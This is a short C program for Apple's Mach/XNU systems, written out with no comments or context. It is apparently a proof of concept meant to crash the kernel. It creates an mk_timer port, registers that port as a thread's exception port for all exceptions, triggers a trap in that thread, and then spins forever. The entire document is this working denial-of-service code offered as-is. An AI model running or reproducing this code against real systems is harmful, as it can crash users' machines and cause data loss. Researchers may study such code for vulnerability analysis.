#include <mach/mach.h>
#include <pthread.h>
#include "mk_timer.h"
void *C(void* a){thread_set_exception_ports(mach_thread_self(),EXC_MASK_ALL,*(int *)a,2,6);__builtin_trap();return a;}
int main(){int p=mk_timer_create();mach_port_insert_right(mach_task_self(),p,p,20);pthread_t t;pthread_create(&t,0,C,&p);for(;;);} 
